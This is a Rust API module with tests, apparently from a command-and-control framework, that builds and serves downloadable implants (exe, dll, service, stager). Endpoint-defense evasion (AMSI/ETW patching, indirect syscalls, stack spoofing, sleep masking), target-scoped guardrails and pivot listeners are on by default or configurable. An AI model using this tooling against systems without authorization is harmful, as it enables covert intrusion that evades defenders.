// src/api/routes/builder.rs

use axum::{
    extract::{Path, State},
    http::{StatusCode, header},
    response::{IntoResponse, Response},
    Json, Extension,
};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use std::path::PathBuf;
use std::process::Stdio;
use tokio::io::AsyncBufReadExt;
use uuid::Uuid;
use chrono::Utc;

use crate::api::state::{ApiContext, BuildJob, BuildStatus};
use crate::api::middleware::OperatorInfo;

// ── Request / Response types ───────────────────────────────────────────

#[derive(Deserialize)]
pub struct BuildRequest {
    pub host: String,
    pub port: String,
    #[serde(default = "default_platform")]  pub platform:   String,
    #[serde(default = "default_transport")] pub transport:  String,
    #[serde(default = "default_profile")]   pub profile:    String,
    #[serde(default = "default_format")]    pub format:     String,
    #[serde(default = "default_sleep")]     pub sleep:      u64,
    #[serde(default = "default_jmin")]      pub jitter_min: u32,
    #[serde(default = "default_jmax")]      pub jitter_max: u32,
    #[serde(default)]                       pub bloat:      u64,
    #[serde(default)]                       pub debug:           bool,
    #[serde(default)]                       pub days:            i64,
    // ── Feature 1: SNI / ALPN overrides ───────────────────────────────
    #[serde(default)]                       pub sni_override:    Option<String>,
    #[serde(default)]                       pub alpn_protocols:  Vec<String>,
    // ── Feature 3: Hibernation / dweller mode ─────────────────────────
    #[serde(default)]                            pub hibernation_mode: bool,
    #[serde(default)]                            pub batch_size:       Option<u32>,
    // ── Evasion ───────────────────────────────────────────────────────
    #[serde(default = "default_sleep_mask")]     pub sleep_mask:        String,
    #[serde(default = "default_true")]           pub indirect_syscalls: bool,
    #[serde(default = "default_true")]           pub stack_spoof:       bool,
    #[serde(default = "default_true")]           pub patch_amsi_etw:    bool,
    #[serde(default = "default_true")]           pub heap_encrypt:      bool,
    // ── Execution guardrails ──────────────────────────────────────────
    #[serde(default)]                            pub guard_domain:      String,
    #[serde(default)]                            pub guard_hostname:    String,
    #[serde(default)]                            pub guard_hour_start:  u8,
    #[serde(default)]                            pub guard_hour_end:    u8,
    #[serde(default)]                            pub guard_no_system:   bool,
    // ── Pivot auto-cascade ────────────────────────────────────────────
    /// When set, the built agent will automatically start a TCP pivot
    /// listener on this port immediately after its session handshake
    /// completes. Use this to pre-wire multi-hop pivot chains at build
    /// time. Omit (or set null) for direct-connect agents and leaf nodes.
    #[serde(default)]                            pub auto_pivot_port:   Option<u16>,
}

fn default_platform()   -> String { "linux".into() }
fn default_transport()  -> String { "tls".into() }
fn default_profile()    -> String { "default".into() }
fn default_format()     -> String { "exe".into() }
fn default_sleep()      -> u64   { 40 }
fn default_jmin()       -> u32   { 20 }
fn default_jmax()       -> u32   { 10 }
fn default_sleep_mask() -> String { "ekko".into() }
fn default_true()       -> bool  { true }

#[derive(Serialize)]
pub struct BuildStarted { pub job_id: String }

#[derive(Serialize)]
pub struct JobStatusResponse {
    pub job_id:        String,
    pub status:        String,
    pub log:           Vec<String>,
    pub artifact_name: Option<String>,
    pub started_at:    String,
    pub finished_at:   Option<String>,
}

// ── Helpers ────────────────────────────────────────────────────────────

fn find_builder_binary() -> Option<PathBuf> {
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            let p = dir.join("builder");
            if p.is_file() { return Some(p); }
        }
    }
    let p = PathBuf::from("./builder");
    if p.is_file() { return Some(p); }
    None
}

fn validate_request(req: &BuildRequest) -> Result<(), String> {
    if req.host.is_empty() { return Err("host is required".into()); }
    if req.port.is_empty() { return Err("port is required".into()); }
    match req.platform.as_str() {
        "linux" | "windows" | "macos" => {}
        o => return Err(format!("invalid platform: {}", o)),
    }
    match req.transport.as_str() {
        "tls" | "tcp_plain" | "named_pipe" | "http" | "https" => {}
        o => return Err(format!("invalid transport: {}", o)),
    }
    match req.profile.as_str() {
        "default" | "http_post" | "http_image" => {}
        o => return Err(format!("invalid profile: {}", o)),
    }
    match req.format.as_str() {
        "exe" | "dll" | "service" | "stager" => {}
        o => return Err(format!("invalid format: {}", o)),
    }
    match req.sleep_mask.as_str() {
        "none" | "ekko" | "foliage" => {}
        o => return Err(format!("invalid sleep_mask: {}", o)),
    }
    if req.jitter_min > 100 { return Err("jitter_min cannot exceed 100".into()); }
    if req.days < 0          { return Err("days must be 0 or positive".into()); }
    if req.guard_hour_start > 23 { return Err("guard_hour_start must be 0–23".into()); }
    if req.guard_hour_end   > 23 { return Err("guard_hour_end must be 0–23".into()); }
    Ok(())
}

// ── CLI arg construction (extracted for testability) ───────────────────

pub fn build_args(req: &BuildRequest) -> Vec<String> {
    let mut args: Vec<String> = vec![
        "--host".into(),       req.host.clone(),
        "--port".into(),       req.port.clone(),
        "--platform".into(),   req.platform.clone(),
        "--transport".into(),  req.transport.replace('_', "-"),
        "--profile".into(),    req.profile.replace('_', "-"),
        "--format".into(),     req.format.clone(),
        "--sleep".into(),      req.sleep.to_string(),
        "--jitter-min".into(), req.jitter_min.to_string(),
        "--jitter-max".into(), req.jitter_max.to_string(),
        "--bloat".into(),      req.bloat.to_string(),
        "--days".into(),       req.days.to_string(),
    ];
    if req.debug { args.push("--debug".into()); }
    if let Some(sni) = &req.sni_override {
        args.push("--sni".into());
        args.push(sni.clone());
    }
    if !req.alpn_protocols.is_empty() {
        args.push("--alpn".into());
        args.push(req.alpn_protocols.join(","));
    }
    if req.hibernation_mode { args.push("--hibernation".into()); }
    if let Some(bs) = req.batch_size {
        args.push("--batch-size".into());
        args.push(bs.to_string());
    }
    // Evasion
    args.push("--sleep-mask".into());
    args.push(req.sleep_mask.clone());
    args.extend(["--indirect-syscalls".into(), req.indirect_syscalls.to_string()]);
    args.extend(["--stack-spoof".into(),       req.stack_spoof.to_string()]);
    args.extend(["--patch-amsi-etw".into(),    req.patch_amsi_etw.to_string()]);
    args.extend(["--heap-encrypt".into(),      req.heap_encrypt.to_string()]);
    // Guardrails
    if !req.guard_domain.is_empty() {
        args.push("--guard-domain".into());
        args.push(req.guard_domain.clone());
    }
    if !req.guard_hostname.is_empty() {
        args.push("--guard-hostname".into());
        args.push(req.guard_hostname.clone());
    }
    if req.guard_hour_start > 0 || req.guard_hour_end > 0 {
        args.push("--guard-hours".into());
        args.push(format!("{}-{}", req.guard_hour_start, req.guard_hour_end));
    }
    if req.guard_no_system { args.push("--guard-no-system".into()); }
    // Pivot auto-cascade
    if let Some(port) = req.auto_pivot_port {
        args.push("--auto-pivot-port".into());
        args.push(port.to_string());
    }
    args
}

// ── Route handlers ─────────────────────────────────────────────────────

/// POST /api/builder/build
pub async fn start_build(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Json(req): Json<BuildRequest>,
) -> Response {
    if operator.is_viewer() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error":"Viewers cannot trigger builds"}))).into_response();
    }
    if let Err(e) = validate_request(&req) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": e}))).into_response();
    }

    let builder_path = match find_builder_binary() {
        Some(p) => p,
        None => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({
            "error": "builder binary not found alongside server binary or in CWD"
        }))).into_response(),
    };

    let job_id = Uuid::new_v4().to_string();
    {
        let mut jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
        jobs.insert(job_id.clone(), BuildJob {
            id:            job_id.clone(),
            status:        BuildStatus::Running,
            log:           Vec::new(),
            artifact_path: None,
            started_at:    Utc::now().to_rfc3339(),
            finished_at:   None,
            operator:      operator.username.clone(),
        });
    }

    if let Ok(conn) = state.db.get() {
        crate::database::audit_log(
            &conn, operator.id, &operator.username, "builder_start", None,
            Some(&format!("platform={} transport={} format={} host={}:{}",
                req.platform, req.transport, req.format, req.host, req.port)),
        );
    }

    let jobs_arc = state.build_jobs.clone();
    let jid      = job_id.clone();

    tokio::spawn(async move {
        let args = build_args(&req);

        fn push(jobs: &std::sync::Arc<std::sync::Mutex<std::collections::HashMap<String, BuildJob>>>,
                id: &str, line: String) {
            if let Ok(mut g) = jobs.lock() {
                if let Some(j) = g.get_mut(id) { j.log.push(line); }
            }
        }

        let mut child = match tokio::process::Command::new(&builder_path)
            .args(&args)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
        {
            Ok(c)  => c,
            Err(e) => {
                push(&jobs_arc, &jid, format!("[-] Failed to spawn builder: {}", e));
                if let Ok(mut g) = jobs_arc.lock() {
                    if let Some(j) = g.get_mut(&jid) {
                        j.status      = BuildStatus::Failed;
                        j.finished_at = Some(Utc::now().to_rfc3339());
                    }
                }
                return;
            }
        };

        let stdout = child.stdout.take().unwrap();
        let stderr = child.stderr.take().unwrap();

        let ja = jobs_arc.clone(); let ji = jid.clone();
        let t1 = tokio::spawn(async move {
            let mut lines = tokio::io::BufReader::new(stdout).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                push(&ja, &ji, line);
            }
        });

        let ja = jobs_arc.clone(); let ji = jid.clone();
        let t2 = tokio::spawn(async move {
            let mut lines = tokio::io::BufReader::new(stderr).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                if !line.trim().is_empty() { push(&ja, &ji, line); }
            }
        });

        let _ = tokio::join!(t1, t2);
        let ok = child.wait().await.map(|s| s.success()).unwrap_or(false);

        let artifact_path: Option<String> = {
            let g = jobs_arc.lock().unwrap_or_else(|e| e.into_inner());
            g.get(&jid).and_then(|j| {
                j.log.iter().find_map(|line| {
                    line.strip_prefix("[+] Binary: ").map(|p| p.trim().to_string())
                })
            })
        };

        if let Ok(mut g) = jobs_arc.lock() {
            if let Some(j) = g.get_mut(&jid) {
                j.status = if ok && artifact_path.is_some() {
                    BuildStatus::Success
                } else {
                    BuildStatus::Failed
                };
                j.artifact_path = artifact_path;
                j.finished_at   = Some(Utc::now().to_rfc3339());
            }
        }
    });

    (StatusCode::ACCEPTED, Json(BuildStarted { job_id })).into_response()
}

/// GET /api/builder/jobs/:id/status
pub async fn job_status(
    State(state): State<Arc<ApiContext>>,
    Extension(_op): Extension<OperatorInfo>,
    Path(job_id): Path<String>,
) -> Response {
    let jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
    match jobs.get(&job_id) {
        None => (StatusCode::NOT_FOUND, Json(serde_json::json!({"error":"Job not found"}))).into_response(),
        Some(job) => {
            let artifact_name = job.artifact_path.as_ref().and_then(|p| {
                std::path::Path::new(p).file_name().map(|n| n.to_string_lossy().into_owned())
            });
            (StatusCode::OK, Json(JobStatusResponse {
                job_id:        job.id.clone(),
                status:        format!("{:?}", job.status).to_lowercase(),
                log:           job.log.clone(),
                artifact_name,
                started_at:    job.started_at.clone(),
                finished_at:   job.finished_at.clone(),
            })).into_response()
        }
    }
}

/// GET /api/builder/jobs
pub async fn list_jobs(
    State(state): State<Arc<ApiContext>>,
    Extension(_op): Extension<OperatorInfo>,
) -> Response {
    let jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
    let mut list: Vec<JobStatusResponse> = jobs.values().map(|job| {
        let artifact_name = job.artifact_path.as_ref().and_then(|p| {
            std::path::Path::new(p).file_name().map(|n| n.to_string_lossy().into_owned())
        });
        JobStatusResponse {
            job_id:        job.id.clone(),
            status:        format!("{:?}", job.status).to_lowercase(),
            log:           vec![],
            artifact_name,
            started_at:    job.started_at.clone(),
            finished_at:   job.finished_at.clone(),
        }
    }).collect();
    list.sort_by(|a, b| b.started_at.cmp(&a.started_at));
    (StatusCode::OK, Json(list)).into_response()
}

/// GET /api/builder/jobs/:id/download
///
/// Protected by the standard X-API-KEY auth middleware.
/// The JS side uses fetch() + blob to trigger the save dialog,
/// which correctly sends the header. Direct browser navigation
/// won't work (no header) — that's intentional.
pub async fn download_artifact(
    State(state): State<Arc<ApiContext>>,
    Extension(_op): Extension<OperatorInfo>,
    Path(job_id): Path<String>,
) -> Response {
    let (artifact_path, artifact_name) = {
        let jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
        match jobs.get(&job_id) {
            None => return (StatusCode::NOT_FOUND, "Job not found").into_response(),
            Some(job) => match (&job.artifact_path, &job.status) {
                (Some(path), BuildStatus::Success) => {
                    let name = std::path::Path::new(path)
                        .file_name()
                        .map(|n| n.to_string_lossy().into_owned())
                        .unwrap_or_else(|| "agent".into());
                    (path.clone(), name)
                }
                (_, BuildStatus::Running) =>
                    return (StatusCode::ACCEPTED, "Build still in progress").into_response(),
                _ =>
                    return (StatusCode::NOT_FOUND, "No artifact (build failed or not started)").into_response(),
            }
        }
    };

    match std::fs::read(&artifact_path) {
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR,
            format!("Failed to read artifact: {}", e)).into_response(),
        Ok(bytes) => {
            let safe_name: String = artifact_name.chars()
                .filter(|c| c.is_alphanumeric() || *c == '.' || *c == '_' || *c == '-')
                .collect();
            (
                StatusCode::OK,
                [
                    (header::CONTENT_TYPE,        "application/octet-stream".into()),
                    (header::CONTENT_DISPOSITION, format!("attachment; filename=\"{}\"", safe_name)),
                    (header::CONTENT_LENGTH,      bytes.len().to_string()),
                ],
                bytes,
            ).into_response()
        }
    }
}

// ── Tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── Fixtures ───────────────────────────────────────────────────────

    fn base_req() -> BuildRequest {
        BuildRequest {
            host:              "10.0.0.1".into(),
            port:              "4443".into(),
            platform:          "linux".into(),
            transport:         "tls".into(),
            profile:           "default".into(),
            format:            "exe".into(),
            sleep:             40,
            jitter_min:        20,
            jitter_max:        10,
            bloat:             0,
            debug:             false,
            days:              0,
            sni_override:      None,
            alpn_protocols:    vec![],
            hibernation_mode:  false,
            batch_size:        None,
            sleep_mask:        "ekko".into(),
            indirect_syscalls: true,
            stack_spoof:       true,
            patch_amsi_etw:    true,
            heap_encrypt:      true,
            guard_domain:      String::new(),
            guard_hostname:    String::new(),
            guard_hour_start:  0,
            guard_hour_end:    0,
            guard_no_system:   false,
            auto_pivot_port:   None,
        }
    }

    fn has_pair(args: &[String], flag: &str, val: &str) -> bool {
        args.windows(2).any(|w| w[0] == flag && w[1] == val)
    }

    fn from_json(s: &str) -> BuildRequest {
        serde_json::from_str(s).expect("valid JSON")
    }

    // ── validate_request ───────────────────────────────────────────────

    #[test]
    fn validate_ok_baseline() {
        assert!(validate_request(&base_req()).is_ok());
    }

    #[test]
    fn validate_err_missing_host() {
        let mut r = base_req(); r.host = String::new();
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn validate_err_missing_port() {
        let mut r = base_req(); r.port = String::new();
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn validate_ok_all_platforms() {
        for p in ["linux", "windows", "macos"] {
            let mut r = base_req(); r.platform = p.into();
            assert!(validate_request(&r).is_ok(), "platform={p}");
        }
    }

    #[test]
    fn validate_err_unknown_platform() {
        let mut r = base_req(); r.platform = "android".into();
        assert!(validate_request(&r).unwrap_err().contains("platform"));
    }

    #[test]
    fn validate_ok_all_transports() {
        for t in ["tls", "tcp_plain", "named_pipe", "http", "https"] {
            let mut r = base_req(); r.transport = t.into();
            assert!(validate_request(&r).is_ok(), "transport={t}");
        }
    }

    #[test]
    fn validate_err_unknown_transport() {
        let mut r = base_req(); r.transport = "udp".into();
        assert!(validate_request(&r).unwrap_err().contains("transport"));
    }

    #[test]
    fn validate_ok_all_formats() {
        for f in ["exe", "dll", "service", "stager"] {
            let mut r = base_req(); r.format = f.into();
            assert!(validate_request(&r).is_ok(), "format={f}");
        }
    }

    #[test]
    fn validate_err_unknown_format() {
        let mut r = base_req(); r.format = "apk".into();
        assert!(validate_request(&r).unwrap_err().contains("format"));
    }

    #[test]
    fn validate_ok_sleep_mask_all_variants() {
        for m in ["none", "ekko", "foliage"] {
            let mut r = base_req(); r.sleep_mask = m.into();
            assert!(validate_request(&r).is_ok(), "sleep_mask={m}");
        }
    }

    #[test]
    fn validate_err_unknown_sleep_mask() {
        let mut r = base_req(); r.sleep_mask = "custom".into();
        assert!(validate_request(&r).unwrap_err().contains("sleep_mask"));
    }

    #[test]
    fn validate_err_jitter_min_over_100() {
        let mut r = base_req(); r.jitter_min = 101;
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn validate_ok_jitter_min_at_boundary() {
        let mut r = base_req(); r.jitter_min = 100;
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_negative_days() {
        let mut r = base_req(); r.days = -1;
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn validate_ok_days_zero() {
        let r = base_req();
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_guard_hour_start_over_23() {
        let mut r = base_req(); r.guard_hour_start = 24;
        assert!(validate_request(&r).unwrap_err().contains("guard_hour_start"));
    }

    #[test]
    fn validate_err_guard_hour_end_over_23() {
        let mut r = base_req(); r.guard_hour_end = 24;
        assert!(validate_request(&r).unwrap_err().contains("guard_hour_end"));
    }

    #[test]
    fn validate_ok_guard_hours_boundary_values() {
        let mut r = base_req();
        r.guard_hour_start = 0;
        r.guard_hour_end   = 23;
        assert!(validate_request(&r).is_ok());
    }

    // ── build_args ────────────────────────────────────────────────────

    #[test]
    fn args_core_fields_present() {
        let r = base_req();
        let a = build_args(&r);
        assert!(has_pair(&a, "--host",      "10.0.0.1"));
        assert!(has_pair(&a, "--port",      "4443"));
        assert!(has_pair(&a, "--platform",  "linux"));
        assert!(has_pair(&a, "--transport", "tls"));
        assert!(has_pair(&a, "--format",    "exe"));
        assert!(has_pair(&a, "--sleep",     "40"));
        assert!(has_pair(&a, "--jitter-min","20"));
        assert!(has_pair(&a, "--jitter-max","10"));
    }

    #[test]
    fn args_transport_underscore_converted_to_dash() {
        let mut r = base_req(); r.transport = "tcp_plain".into();
        assert!(has_pair(&build_args(&r), "--transport", "tcp-plain"));
    }

    #[test]
    fn args_profile_underscore_converted_to_dash() {
        let mut r = base_req(); r.profile = "http_post".into();
        assert!(has_pair(&build_args(&r), "--profile", "http-post"));
    }

    #[test]
    fn args_debug_flag_included_when_true() {
        let mut r = base_req(); r.debug = true;
        assert!(build_args(&r).contains(&"--debug".to_string()));
    }

    #[test]
    fn args_debug_flag_omitted_when_false() {
        assert!(!build_args(&base_req()).contains(&"--debug".to_string()));
    }

    #[test]
    fn args_sleep_mask_always_forwarded() {
        for m in ["none", "ekko", "foliage"] {
            let mut r = base_req(); r.sleep_mask = m.into();
            assert!(has_pair(&build_args(&r), "--sleep-mask", m), "sleep_mask={m}");
        }
    }

    #[test]
    fn args_evasion_flags_all_on() {
        let r = base_req();
        let a = build_args(&r);
        assert!(has_pair(&a, "--indirect-syscalls", "true"));
        assert!(has_pair(&a, "--stack-spoof",       "true"));
        assert!(has_pair(&a, "--patch-amsi-etw",    "true"));
        assert!(has_pair(&a, "--heap-encrypt",      "true"));
    }

    #[test]
    fn args_evasion_flags_all_off() {
        let mut r = base_req();
        r.indirect_syscalls = false;
        r.stack_spoof       = false;
        r.patch_amsi_etw    = false;
        r.heap_encrypt      = false;
        let a = build_args(&r);
        assert!(has_pair(&a, "--indirect-syscalls", "false"));
        assert!(has_pair(&a, "--stack-spoof",       "false"));
        assert!(has_pair(&a, "--patch-amsi-etw",    "false"));
        assert!(has_pair(&a, "--heap-encrypt",      "false"));
    }

    #[test]
    fn args_evasion_flags_independently_toggled() {
        let mut r = base_req();
        r.indirect_syscalls = false; r.stack_spoof = false;
        r.patch_amsi_etw    = false; r.heap_encrypt = false;

        r.indirect_syscalls = true;
        let a = build_args(&r);
        assert!(has_pair(&a, "--indirect-syscalls", "true"));
        assert!(has_pair(&a, "--stack-spoof",       "false"));
        assert!(has_pair(&a, "--patch-amsi-etw",    "false"));
        assert!(has_pair(&a, "--heap-encrypt",      "false"));
    }

    #[test]
    fn args_guard_domain_included_when_set() {
        let mut r = base_req(); r.guard_domain = "CORP*".into();
        assert!(has_pair(&build_args(&r), "--guard-domain", "CORP*"));
    }

    #[test]
    fn args_guard_domain_omitted_when_empty() {
        assert!(!build_args(&base_req()).contains(&"--guard-domain".to_string()));
    }

    #[test]
    fn args_guard_hostname_included_when_set() {
        let mut r = base_req(); r.guard_hostname = "DESKTOP-*".into();
        assert!(has_pair(&build_args(&r), "--guard-hostname", "DESKTOP-*"));
    }

    #[test]
    fn args_guard_hostname_omitted_when_empty() {
        assert!(!build_args(&base_req()).contains(&"--guard-hostname".to_string()));
    }

    #[test]
    fn args_guard_hours_formatted_correctly() {
        let mut r = base_req();
        r.guard_hour_start = 8;
        r.guard_hour_end   = 18;
        assert!(has_pair(&build_args(&r), "--guard-hours", "8-18"));
    }

    #[test]
    fn args_guard_hours_omitted_when_both_zero() {
        assert!(!build_args(&base_req()).contains(&"--guard-hours".to_string()));
    }

    #[test]
    fn args_guard_hours_included_when_only_start_set() {
        let mut r = base_req(); r.guard_hour_start = 9;
        assert!(has_pair(&build_args(&r), "--guard-hours", "9-0"));
    }

    #[test]
    fn args_guard_hours_included_when_only_end_set() {
        let mut r = base_req(); r.guard_hour_end = 17;
        assert!(has_pair(&build_args(&r), "--guard-hours", "0-17"));
    }

    #[test]
    fn args_guard_no_system_included_when_true() {
        let mut r = base_req(); r.guard_no_system = true;
        assert!(build_args(&r).contains(&"--guard-no-system".to_string()));
    }

    #[test]
    fn args_guard_no_system_omitted_when_false() {
        assert!(!build_args(&base_req()).contains(&"--guard-no-system".to_string()));
    }

    #[test]
    fn args_sni_included_when_set() {
        let mut r = base_req(); r.sni_override = Some("cdn.example.com".into());
        assert!(has_pair(&build_args(&r), "--sni", "cdn.example.com"));
    }

    #[test]
    fn args_sni_omitted_when_none() {
        assert!(!build_args(&base_req()).contains(&"--sni".to_string()));
    }

    #[test]
    fn args_alpn_joined_with_comma() {
        let mut r = base_req(); r.alpn_protocols = vec!["h2".into(), "http/1.1".into()];
        assert!(has_pair(&build_args(&r), "--alpn", "h2,http/1.1"));
    }

    #[test]
    fn args_alpn_omitted_when_empty() {
        assert!(!build_args(&base_req()).contains(&"--alpn".to_string()));
    }

    #[test]
    fn args_hibernation_flag() {
        let mut r = base_req(); r.hibernation_mode = true;
        assert!(build_args(&r).contains(&"--hibernation".to_string()));
    }

    #[test]
    fn args_hibernation_omitted_when_false() {
        assert!(!build_args(&base_req()).contains(&"--hibernation".to_string()));
    }

    #[test]
    fn args_batch_size_forwarded() {
        let mut r = base_req(); r.batch_size = Some(5);
        assert!(has_pair(&build_args(&r), "--batch-size", "5"));
    }

    #[test]
    fn args_batch_size_omitted_when_none() {
        assert!(!build_args(&base_req()).contains(&"--batch-size".to_string()));
    }

    // ── auto_pivot_port ───────────────────────────────────────────────

    #[test]
    fn args_auto_pivot_port_included_when_set() {
        let mut r = base_req(); r.auto_pivot_port = Some(5002);
        assert!(has_pair(&build_args(&r), "--auto-pivot-port", "5002"));
    }

    #[test]
    fn args_auto_pivot_port_omitted_when_none() {
        assert!(!build_args(&base_req()).contains(&"--auto-pivot-port".to_string()));
    }

    #[test]
    fn args_auto_pivot_port_various_ports() {
        for port in [1024u16, 5001, 8080, 65535] {
            let mut r = base_req(); r.auto_pivot_port = Some(port);
            assert!(
                has_pair(&build_args(&r), "--auto-pivot-port", &port.to_string()),
                "port={port}"
            );
        }
    }

    // ── Serde defaults ────────────────────────────────────────────────

    #[test]
    fn serde_defaults_evasion_on() {
        let r = from_json(r#"{"host":"h","port":"p"}"#);
        assert_eq!(r.sleep_mask, "ekko");
        assert!(r.indirect_syscalls, "indirect_syscalls should default true");
        assert!(r.stack_spoof,       "stack_spoof should default true");
        assert!(r.patch_amsi_etw,    "patch_amsi_etw should default true");
        assert!(r.heap_encrypt,      "heap_encrypt should default true");
    }

    #[test]
    fn serde_defaults_guardrails_off() {
        let r = from_json(r#"{"host":"h","port":"p"}"#);
        assert_eq!(r.guard_domain,     "");
        assert_eq!(r.guard_hostname,   "");
        assert_eq!(r.guard_hour_start, 0);
        assert_eq!(r.guard_hour_end,   0);
        assert!(!r.guard_no_system);
    }

    #[test]
    fn serde_auto_pivot_port_defaults_none() {
        let r = from_json(r#"{"host":"h","port":"p"}"#);
        assert!(r.auto_pivot_port.is_none());
    }

    #[test]
    fn serde_auto_pivot_port_explicit_value() {
        let r = from_json(r#"{"host":"h","port":"p","auto_pivot_port":5003}"#);
        assert_eq!(r.auto_pivot_port, Some(5003));
    }

    #[test]
    fn serde_auto_pivot_port_explicit_null() {
        let r = from_json(r#"{"host":"h","port":"p","auto_pivot_port":null}"#);
        assert!(r.auto_pivot_port.is_none());
    }

    #[test]
    fn serde_evasion_selectively_disabled() {
        let r = from_json(
            r#"{"host":"h","port":"p","indirect_syscalls":false,"patch_amsi_etw":false}"#,
        );
        assert!(!r.indirect_syscalls);
        assert!(!r.patch_amsi_etw);
        assert!(r.stack_spoof,  "unspecified field should still default true");
        assert!(r.heap_encrypt, "unspecified field should still default true");
    }

    #[test]
    fn serde_sleep_mask_explicit_foliage() {
        let r = from_json(r#"{"host":"h","port":"p","sleep_mask":"foliage"}"#);
        assert_eq!(r.sleep_mask, "foliage");
    }

    #[test]
    fn serde_sleep_mask_explicit_none() {
        let r = from_json(r#"{"host":"h","port":"p","sleep_mask":"none"}"#);
        assert_eq!(r.sleep_mask, "none");
    }

    #[test]
    fn serde_guardrails_fully_populated() {
        let r = from_json(r#"{
            "host":"h","port":"p",
            "guard_domain":"CORP*",
            "guard_hostname":"DESKTOP-*",
            "guard_hour_start":8,
            "guard_hour_end":18,
            "guard_no_system":true
        }"#);
        assert_eq!(r.guard_domain,     "CORP*");
        assert_eq!(r.guard_hostname,   "DESKTOP-*");
        assert_eq!(r.guard_hour_start, 8);
        assert_eq!(r.guard_hour_end,   18);
        assert!(r.guard_no_system);
    }

    #[test]
    fn serde_defaults_core_fields() {
        let r = from_json(r#"{"host":"h","port":"p"}"#);
        assert_eq!(r.platform,   "linux");
        assert_eq!(r.transport,  "tls");
        assert_eq!(r.profile,    "default");
        assert_eq!(r.format,     "exe");
        assert_eq!(r.sleep,      40);
        assert_eq!(r.jitter_min, 20);
        assert_eq!(r.jitter_max, 10);
        assert_eq!(r.bloat,      0);
        assert_eq!(r.days,       0);
    }

    // ── validate_request — profile ────────────────────────────────────

    #[test]
    fn validate_ok_all_profiles() {
        for p in ["default", "http_post", "http_image"] {
            let mut r = base_req(); r.profile = p.into();
            assert!(validate_request(&r).is_ok(), "profile={p}");
        }
    }

    #[test]
    fn validate_err_unknown_profile() {
        let mut r = base_req(); r.profile = "slack".into();
        assert!(validate_request(&r).unwrap_err().contains("profile"));
    }

    // ── build_args — core fields not yet explicitly covered ───────────

    #[test]
    fn args_bloat_nonzero_forwarded() {
        let mut r = base_req(); r.bloat = 10;
        assert!(has_pair(&build_args(&r), "--bloat", "10"));
    }

    #[test]
    fn args_bloat_zero_still_forwarded() {
        assert!(has_pair(&build_args(&base_req()), "--bloat", "0"));
    }

    #[test]
    fn args_days_nonzero_forwarded() {
        let mut r = base_req(); r.days = 30;
        assert!(has_pair(&build_args(&r), "--days", "30"));
    }

    #[test]
    fn args_days_zero_still_forwarded() {
        assert!(has_pair(&build_args(&base_req()), "--days", "0"));
    }

    #[test]
    fn args_platform_windows_forwarded() {
        let mut r = base_req(); r.platform = "windows".into();
        assert!(has_pair(&build_args(&r), "--platform", "windows"));
    }

    #[test]
    fn args_platform_macos_forwarded() {
        let mut r = base_req(); r.platform = "macos".into();
        assert!(has_pair(&build_args(&r), "--platform", "macos"));
    }

    #[test]
    fn args_format_dll_forwarded() {
        let mut r = base_req(); r.format = "dll".into();
        assert!(has_pair(&build_args(&r), "--format", "dll"));
    }

    #[test]
    fn args_format_stager_forwarded() {
        let mut r = base_req(); r.format = "stager".into();
        assert!(has_pair(&build_args(&r), "--format", "stager"));
    }

    // ── build_args — guard hours edge cases ──────────────────────────

    #[test]
    fn args_guard_hours_only_end_set() {
        let mut r = base_req(); r.guard_hour_end = 17;
        assert!(has_pair(&build_args(&r), "--guard-hours", "0-17"));
    }

    #[test]
    fn args_guard_hours_max_boundary() {
        let mut r = base_req();
        r.guard_hour_start = 23;
        r.guard_hour_end   = 23;
        assert!(has_pair(&build_args(&r), "--guard-hours", "23-23"));
    }

    #[test]
    fn args_guard_hours_full_day_window() {
        let mut r = base_req();
        r.guard_hour_start = 0;
        r.guard_hour_end   = 23;
        assert!(has_pair(&build_args(&r), "--guard-hours", "0-23"));
    }

    // ── build_args — no unexpected duplicates ─────────────────────────

    #[test]
    fn args_sleep_mask_appears_exactly_once() {
        let r = base_req();
        let a = build_args(&r);
        let count = a.iter().filter(|s| s.as_str() == "--sleep-mask").count();
        assert_eq!(count, 1, "--sleep-mask should appear exactly once");
    }

    #[test]
    fn args_host_appears_exactly_once() {
        let r = base_req();
        let a = build_args(&r);
        assert_eq!(a.iter().filter(|s| s.as_str() == "--host").count(), 1);
    }

    #[test]
    fn args_auto_pivot_port_appears_at_most_once() {
        let mut r = base_req(); r.auto_pivot_port = Some(5002);
        let a = build_args(&r);
        assert_eq!(a.iter().filter(|s| s.as_str() == "--auto-pivot-port").count(), 1);
    }
}
